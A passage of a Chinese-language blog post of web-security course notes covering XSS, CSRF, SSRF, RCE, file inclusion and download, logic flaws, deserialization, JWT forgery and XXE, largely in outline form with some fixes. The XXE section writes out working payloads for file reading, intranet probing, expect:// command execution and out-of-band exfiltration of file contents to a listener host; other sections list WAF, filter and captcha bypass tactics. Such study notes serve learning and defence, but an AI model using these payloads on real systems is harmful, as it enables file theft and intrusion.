+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># XSS跨站漏洞产生原理，危害，特点</span><br><span class="line">本质：脚本语言注入网页之中</span><br><span class="line">产生层面，函数类，漏洞操作对应层，危害影响，浏览器内核版本</span><br><span class="line"></span><br><span class="line"># XSS跨站漏洞分类：反射（非持续型），存储（持续型），DOM</span><br><span class="line">存储型：攻击被记录到数据库中，每次打开页面都会触发漏洞</span><br><span class="line">反射型：攻击被写在get或POST中，不会写入数据库</span><br><span class="line">DOM型：请求并没有发送给后端的脚本代码，而是直接由静态前端代码执行完毕，并回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/01/xiaodi1/image-20211025151438842.png" alt="image-20211025151438842"></p>
+<blockquote>
+<p>DOM树</p>
+<p>页面内容大多时通过url控制，有的页面内容改变但url没有改变，是因为通过DOM，使用脚本获取新的信息，没有改变url。</p>
+</blockquote>
+<h2 id="第二十六天"><a href="#第二十六天" class="headerlink" title="第二十六天"></a>第二十六天</h2><p>通过构造js代码，可以让其他用户浏览注入信息时，触发js代码，连接指定服务器，发送payload，获取cookie等信息。</p>
+<p><strong>beef工具攻击</strong></p>
+<h3 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h3><p>cookie：存储在本地，存活时间较长，小中型<br>session：会话存储在服务器，存活时间较短，大型</p>
+<p>可以通过phpinfo读取到session</p>
+<h2 id="第二十七天"><a href="#第二十七天" class="headerlink" title="第二十七天"></a>第二十七天</h2><h3 id="HTTPONLY"><a href="#HTTPONLY" class="headerlink" title="HTTPONLY"></a>HTTPONLY</h3><p>防止js无法读取cookie</p>
+<p>进入后台的方法</p>
+<ul>
+<li>cookie</li>
+<li>账号密码</li>
+</ul>
+<p>绕过httponlu：</p>
+<ul>
+<li>浏览器未保存账号密码：需要xss缠身登录地址，利用表单劫持</li>
+<li>浏览器保存账号密码：产生在后台的xss，存储型xss如留言等，从看清回去读取账号密码</li>
+</ul>
+<h2 id="xss过滤：-大小写-双写-编码-添加检测内容，注释检测内容"><a href="#xss过滤：-大小写-双写-编码-添加检测内容，注释检测内容" class="headerlink" title="xss过滤：- 大小写- 双写- 编码- 添加检测内容，注释检测内容"></a>xss过滤：<br>- 大小写<br>- 双写<br>- 编码<br>- 添加检测内容，注释检测内容</h2><h2 id="防御csrf-同源策略"><a href="#防御csrf-同源策略" class="headerlink" title="防御csrf- 同源策略"></a>防御csrf<br>- 同源策略</h2><h2 id="第二十八天"><a href="#第二十八天" class="headerlink" title="第二十八天"></a>第二十八天</h2><h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><p>常规waf绕过思路</p>
+<ul>
+<li>标签语法替换</li>
+<li>特殊符号干扰</li>
+<li>提交方式更改</li>
+<li>垃圾数据一处</li>
+<li>加密解密算法</li>
+<li>结合其他漏洞</li>
+</ul>
+<h2 id="第二十九天"><a href="#第二十九天" class="headerlink" title="第二十九天"></a>第二十九天</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><ul>
+<li>随机token，检测数据包唯一性		不可绕过</li>
+<li>同源策略，referer					可绕过</li>
+<li>需要输入密码</li>
+<li>验证码</li>
+<li>限制请求方式为POST请求</li>
+</ul>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><img src="/2021/10/01/xiaodi1/ssrf.png" alt="ssrf"></p>
+<p>利用协议：http、file、dict、ftp、gopher等</p>
+<p>漏洞攻击：端口扫描、指纹之别、漏洞利用、内网探针</p>
+<h2 id="第三十天"><a href="#第三十天" class="headerlink" title="第三十天"></a>第三十天</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>原理：</p>
+<ul>
+<li>现实应用情况<ul>
+<li>根据实际情况找可能存在的相关漏洞</li>
+</ul>
+</li>
+<li>网站代码情况<ul>
+<li>可控变量</li>
+<li>漏洞函数</li>
+</ul>
+</li>
+</ul>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>执行脚本代码：php、java、python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># php</span><br><span class="line">eval()			将参数当作php代码执行</span><br><span class="line">echo()			输出参数执行</span><br><span class="line">	echo 参数	代码执行</span><br><span class="line">	echo `参数`	命令执行</span><br><span class="line">system()		执行操作系统命令并输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>检测方法</p>
+<ul>
+<li>白盒<ul>
+<li>代码审计</li>
+</ul>
+</li>
+<li>黑盒<ul>
+<li>扫描工具</li>
+<li>公开漏洞</li>
+<li>手工看参数值及功能点</li>
+</ul>
+</li>
+</ul>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>执行系统命令：linux、windows</p>
+<h2 id="第三十一天"><a href="#第三十一天" class="headerlink" title="第三十一天"></a>第三十一天</h2><h3 id="文件操作安全漏洞"><a href="#文件操作安全漏洞" class="headerlink" title="文件操作安全漏洞"></a>文件操作安全漏洞</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>见第24天</p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ul>
+<li>白盒<ul>
+<li>代码审计</li>
+</ul>
+</li>
+<li>黑盒<ul>
+<li>扫描工具</li>
+<li>公开漏洞</li>
+<li>手工看参数值及功能点</li>
+</ul>
+</li>
+</ul>
+<h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul>
+<li>本地包含<ul>
+<li>无限制</li>
+<li>有限制</li>
+</ul>
+</li>
+<li>远程包含<ul>
+<li>无限制</li>
+<li>有限制</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本地包含</span><br><span class="line">绕过包含文件加后缀方法</span><br><span class="line">1. %00截断</span><br><span class="line">2. 添加./至文件名长度大于系统要求长度，windows系统文件名最大长度256位、linux系统文件名最大长度4096位</span><br><span class="line"></span><br><span class="line">远程包含</span><br><span class="line">限制文件名</span><br><span class="line">在文件名后添加：%20、%23、?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用协议<br><img src="/2021/10/01/xiaodi1/fileload.png" alt="fileload"></p>
+<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><ul>
+<li>固定后缀</li>
+<li>固定文件</li>
+<li>WAF产品</li>
+</ul>
+<h2 id="第三十二天"><a href="#第三十二天" class="headerlink" title="第三十二天"></a>第三十二天</h2><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>产生原因：任意语言代码文件下载功能函数</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul>
+<li>常见文件<ul>
+<li>后台首页日志等</li>
+</ul>
+</li>
+<li>敏感文件<ul>
+<li>数据库配置文件</li>
+<li>各种接口文件</li>
+<li>密钥信息文件</li>
+</ul>
+</li>
+</ul>
+<h5 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h5><ul>
+<li>扫描工具爬取或扫描地址</li>
+<li>下载好的代码中分析路径和包含文件漏洞获取</li>
+</ul>
+<h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ul>
+<li>wAF产品</li>
+<li>固定目录或过滤跨目录符号</li>
+<li>目录权限设置或单独文件权限设置</li>
+</ul>
+<blockquote>
+<p>1.文件被解析——文件包含漏洞</p>
+<p>2.显示源代码——文件读取漏洞</p>
+<p>3.提示文件下载——文件下载漏洞</p>
+</blockquote>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><h2 id="第三十三天"><a href="#第三十三天" class="headerlink" title="第三十三天"></a>第三十三天</h2><h3 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h3><p>代码层面安全问题</p>
+<h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p>分类：</p>
+<ul>
+<li>水平越权<ul>
+<li>获取同级别其他用户的数据</li>
+</ul>
+</li>
+<li>垂直越权<ul>
+<li>执行更高权限账号才可执行的操作</li>
+</ul>
+</li>
+<li>未授权访问<ul>
+<li>通过删除请求中的认证信息重放请求，依旧可以访问或完成操作</li>
+</ul>
+</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>前端安全造成：界面<ul>
+<li>判断用户等级后，代码界面部分进行可选显示</li>
+</ul>
+</li>
+<li>后端安全造成：数据库<ul>
+<li>数据包有传输用户编号、用户组编号、类型编号时，尝试对值进行修改，测试越权漏洞</li>
+</ul>
+</li>
+</ul>
+<h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>如何获取操作请求数据包</p>
+<ul>
+<li>普通用户前端有操作界面可以抓取数据包</li>
+<li>通过网站源码本地搭建自己模拟抓取</li>
+<li>盲猜</li>
+</ul>
+<h2 id="第三十四天"><a href="#第三十四天" class="headerlink" title="第三十四天"></a>第三十四天</h2><h4 id="登录功能点"><a href="#登录功能点" class="headerlink" title="登录功能点"></a>登录功能点</h4><ul>
+<li>暴力破解</li>
+<li>本地加密传输（HTTP&#x2F;HTTPS传输）<ul>
+<li>密码加密</li>
+</ul>
+</li>
+<li>cookie脆弱<ul>
+<li>cookie认证存在漏洞</li>
+</ul>
+</li>
+<li>session劫持</li>
+<li>密文对比认证</li>
+</ul>
+<h4 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h4><ul>
+<li>支付篡改</li>
+<li>数量篡改</li>
+<li>请求重放</li>
+</ul>
+<h2 id="第三十五天"><a href="#第三十五天" class="headerlink" title="第三十五天"></a>第三十五天</h2><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><h4 id="找回"><a href="#找回" class="headerlink" title="找回"></a>找回</h4><p>找回重置机制</p>
+<ul>
+<li>客户端回显</li>
+<li>response状态值</li>
+<li>验证码爆破</li>
+<li>找回流程绕过</li>
+</ul>
+<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口调用</p>
+<ul>
+<li>短信轰炸</li>
+<li>来电轰炸</li>
+</ul>
+<h2 id="第三十六天"><a href="#第三十六天" class="headerlink" title="第三十六天"></a>第三十六天</h2><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>绕过方法</p>
+<ul>
+<li>token<ul>
+<li>爆破</li>
+<li>回显</li>
+<li>固定</li>
+</ul>
+</li>
+<li>验证码<ul>
+<li>爆破</li>
+<li>识别</li>
+<li>复用</li>
+<li>回显</li>
+<li>绕过</li>
+</ul>
+</li>
+</ul>
+<h5 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h5><p>分类：图片、手机、邮箱、语音、视频、操作等</p>
+<p>原因：验证生成或验证过程中的逻辑问题</p>
+<p>危害：账号权限泄露、短信轰炸、遍历、任意用户操作</p>
+<p>漏洞：客户端回显、验证码复用、验证码爆破、绕过</p>
+<h5 id="token"><a href="#token" class="headerlink" title="token"></a>token</h5><p>爆破方法，burp抓包</p>
+<h2 id="第三十七天"><a href="#第三十七天" class="headerlink" title="第三十七天"></a>第三十七天</h2><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>系列化：对象转字符串		有利于传输与保存</p>
+<p>反序列化：字符串转对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;string1&quot;——s:7:&quot;string1&quot;</span><br><span class="line">123——i:123</span><br></pre></td></tr></table></figure>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>sql注入</li>
+<li>代码执行</li>
+<li>目录遍历</li>
+</ul>
+<h4 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h4><ul>
+<li>有类<ul>
+<li>触发魔术方法<ul>
+<li>__construct</li>
+<li>__destruct</li>
+<li>__call</li>
+<li>__callStatic</li>
+<li>__get</li>
+<li>__set</li>
+<li>__isset</li>
+<li>__unset</li>
+<li>__invoke</li>
+<li>__wakeup</li>
+<li>__trstring</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>无类</li>
+</ul>
+<h2 id="第三十八天"><a href="#第三十八天" class="headerlink" title="第三十八天"></a>第三十八天</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul>
+<li>payload生成器<ul>
+<li>ysoserial</li>
+</ul>
+</li>
+<li>自定义检测工具或脚本</li>
+</ul>
+<h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><blockquote>
+<p>一段数据由<code>rO0AB</code>开头，一般是java序列化base64加密<br>一段数据由<code>aced</code>开头，一般是java序列化的16进制</p>
+</blockquote>
+<ul>
+<li>黑盒<ul>
+<li>数据格式点<ul>
+<li>HTTP请求参数</li>
+<li>自定义协议</li>
+<li>RMI协议</li>
+<li>子主题5</li>
+</ul>
+</li>
+<li>特定特征扫描</li>
+</ul>
+</li>
+<li>白盒<ul>
+<li>函数点<ul>
+<li>objectInputStream.readObject</li>
+<li>objectInputStream.readUnshared</li>
+<li>objectMapper.readValue</li>
+<li>XMLDecoder.readObject</li>
+<li>XStream.fromXML</li>
+<li>JSON.parseObject</li>
+</ul>
+</li>
+<li>组件点<ul>
+<li>参考ysoserial库</li>
+</ul>
+</li>
+<li>代码点<ul>
+<li>RCE执行</li>
+<li>数据认证</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="第三十九天"><a href="#第三十九天" class="headerlink" title="第三十九天"></a>第三十九天</h2><h3 id="XXE-amp-XML利用检测绕过"><a href="#XXE-amp-XML利用检测绕过" class="headerlink" title="XXE&amp;XML利用检测绕过"></a>XXE&amp;XML利用检测绕过</h3><p><img src="/2021/10/01/xiaodi1/xml.png" alt="xml"></p>
+<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul>
+<li>XML<ul>
+<li>传输和存储数据的语言或格式</li>
+<li>XML文档结构包含XML生命、DTD文档类型定义、文档元素</li>
+<li>独立于原件和硬件的信息传输工具</li>
+</ul>
+</li>
+<li>XXE<ul>
+<li>XML外部实体注入漏洞<blockquote>
+<p>HTML用来显示数据，焦点是数据的外观</p>
+<p>XML用来传输和存储数据，焦点是数据的内容</p>
+<p>HTML旨在显示信息，XML旨在传输信息</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>文件读取</li>
+<li>RCE执行</li>
+<li>内网攻击</li>
+<li>DOS攻击</li>
+</ul>
+<p><img src="/2021/10/01/xiaodi1/%E8%84%9A%E6%9C%AC%E6%94%AF%E6%8C%81%E5%8D%8F%E8%AE%AE.png" alt="脚本本支持协议"></p>
+<h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><ul>
+<li>白盒<ul>
+<li>函数及可控变量查找</li>
+<li>存储和存储数据格式类型</li>
+</ul>
+</li>
+<li>黑盒<ul>
+<li>人工<ul>
+<li>数据格式类型判断<ul>
+<li><code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code></li>
+</ul>
+</li>
+<li>content-TYPE值判断<ul>
+<li>text&#x2F;xml</li>
+<li>application&#x2F;xml</li>
+</ul>
+</li>
+<li>更改content-type值看返回</li>
+</ul>
+</li>
+<li>工具</li>
+</ul>
+</li>
+</ul>
+<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><ul>
+<li>输出形式<ul>
+<li>有回显<ul>
+<li>协议玩法<ul>
+<li>http</li>
+<li>file</li>
+<li>各种脚本支持协议</li>
+</ul>
+</li>
+<li>外部利用</li>
+</ul>
+</li>
+<li>无回显<ul>
+<li>外部利用-反向链接配合</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>过滤绕过<ul>
+<li>协议玩法</li>
+<li>外部引用</li>
+<li>编码UTF-16BE</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># 读取文件</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># 内网探针</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;? encoding=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.103:8081/index.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># RCE</span><br><span class="line"># 在安装expect扩展的php环境里执行系统命令</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line"># 引入外部实体</span><br><span class="line"># 只有在设置允许引入外部实体时才有用</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evilw.dtd&quot;&gt;</span><br><span class="line">	%file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 无回显-读取文件</span><br><span class="line"># 1.读取文件</span><br><span class="line"># 2.引入外部实体，外部实体向指定url发出请求，参数为读取文件</span><br><span class="line"># 3.查看日志</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/text.txt&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.0.103:8081/test.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &quot;http://192.168.0.103:8081/?data=%file;&quot;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br><span class="line"></span><br><span class="line"># 协议-读文件（绕过）</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li><code>ENTITY</code>,<code>SYSTEM``file</code>等关键词被过滤<ul>
+<li>编码绕过：UTF-16BE</li>
+</ul>
+</li>
+<li>http被过滤<ul>
+<li>data:&#x2F;&#x2F;协议绕过</li>
+<li>file:&#x2F;&#x2F;协议加文件上传</li>
+<li>php:&#x2F;&#x2F;filter协议加文件上传</li>
+</ul>
+</li>
+</ul>
+<h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><ul>
+<li>进制外部实体引用</li>
+<li>过滤关键字</li>
+<li>WAF</li>
+</ul>
+<h2 id="第四十天"><a href="#第四十天" class="headerlink" title="第四十天"></a>第四十天</h2><h3 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h3><p><img src="/2021/10/01/xiaodi1/java.png" alt="java"></p>
+<h4 id="JWT安全及预编译CASE注入"><a href="#JWT安全及预编译CASE注入" class="headerlink" title="JWT安全及预编译CASE注入"></a>JWT安全及预编译CASE注入</h4><p><img src="/2021/10/01/xiaodi1/jwt.png" alt="jwt"></p>
+<p>jwt（JSON Web Token）一种跨域验证身份方案，jwt不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p>
+<p>jwt的数据分为三部分：头部、声明、签名，BASE64加密<br><img src="/2021/10/01/xiaodi1/jwt%E7%AD%BE%E5%90%8D.png" alt="jwt签名"><br><img src="/2021/10/01/xiaodi1/jwt%E4%BC%A0%E8%BE%93.png" alt="jwt传输"></p>
+<h5 id="防御sql注入"><a href="#防御sql注入" class="headerlink" title="防御sql注入"></a>防御sql注入</h5><ul>
+<li>session（session内容正常情况下用户无法修改sql语句）</li>
+<li>参数绑定（sql预编译）<ul>
+<li>通过case when语句可以将order by后的orderExpression表达式中添加select语句</li>
+</ul>
+</li>
+</ul>
+<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><h6 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h6><p>####### 无密钥<br>由于签名存在，修改前面的声明会被发现与签名不对应，是无效token；解决方法是在header中加密模式改为none，即不加密，签名则为空，可实现身份验证。</p>
+<blockquote>
+<p>在HTTP传输中，BASE64的<code>=``+``,``/</code>容易产生歧义，故产生了与URL兼容三BASE64 URL编码</p>
+</blockquote>
+<p>####### 有密钥<br>修改数据后加密</p>
+<h6 id="爆破攻击"><a href="#爆破攻击" class="headerlink" title="爆破攻击"></a>爆破攻击</h6><h2 id="第四十一天"><a href="#第四十一天" class="headerlink" title="第四十一天"></a>第四十一天</h2><h3 id="JAVA安全-目录遍历、访问控制、xss"><a href="#JAVA安全-目录遍历、访问控制、xss" class="headerlink" title="JAVA安全-目录遍历、访问控制、xss"></a>JAVA安全-目录遍历、访问控制、xss</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>双写绕过</p>
+<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/" data-id="clfpez940000efcv57bwx5jbv" data-title="小迪安全" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/10/01/NAT/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          NAT
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/ICMP/">ICMP</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/docker/">docker</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/network/">计算机网络</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
